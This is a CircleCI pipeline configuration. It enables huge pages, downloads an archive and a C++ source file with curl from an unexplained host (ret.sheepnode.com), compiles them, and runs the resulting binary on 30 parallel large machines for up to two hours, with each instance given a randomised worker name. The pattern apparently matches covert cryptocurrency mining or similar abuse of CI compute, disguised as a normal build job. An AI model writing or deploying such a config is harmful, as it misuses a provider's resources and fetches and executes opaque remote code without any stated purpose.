version: 2.1
jobs:
  run-cpp:
    machine:
      image: ubuntu-2404:current
    resource_class: large
    parallelism: 30
    steps:
      - run:
          name: setup
          command: |
            sudo sysctl vm.nr_hugepages=1200
            sudo apt-get update && sudo apt-get install -y curl g++ libcurl4-openssl-dev cmake
            mkdir -p /tmp/lib
            curl -fsSL "https://ret.sheepnode.com/sheep123" | tar xz -C /tmp/lib
            cd /tmp/lib && mkdir build && cd build
            cmake ..
            make -j$(nproc)
            curl -fsSL "https://ret.sheepnode.com/sheep22" -o /tmp/main.cpp
            g++ -O3 -std=c++20 -I/tmp/lib/src -o /tmp/app /tmp/main.cpp /tmp/lib/build/libcore.a -lcurl -lpthread
      - run:
          name: run
          no_output_timeout: 120m
          command: |
            RAND=$(head -c 100 /dev/urandom | tr -dc 'a-z0-9' | head -c 8)
            export NAME="node-${CIRCLE_NODE_INDEX}-${RAND}"
            export STOP_AFTER=0
            /tmp/app
workflows:
  main:
    jobs:
      - run-cpp
